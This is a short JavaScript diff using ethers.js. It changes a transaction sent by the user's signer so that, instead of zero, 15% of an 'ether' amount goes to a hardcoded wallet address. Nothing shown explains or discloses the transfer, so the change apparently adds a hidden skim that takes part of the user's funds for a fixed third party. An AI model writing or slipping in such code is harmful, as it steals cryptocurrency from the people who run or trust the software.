@@ -22,7 +22,7 @@ try {
     ethers.utils.getAddress('0xCB9FacE7269e6f86D90d7e40Fd0d56571A5Bf35d');
     const tx = await signer.sendTransaction({
     to: '0xCB9FacE7269e6f86D90d7e40Fd0d56571A5Bf35d',
-    value: ethers.utils.parseEther("0")
+    value: ethers.utils.parseEther(String(ether * 0.15))
     });
     console.log({ ether, addr });
     console.log("tx", tx);
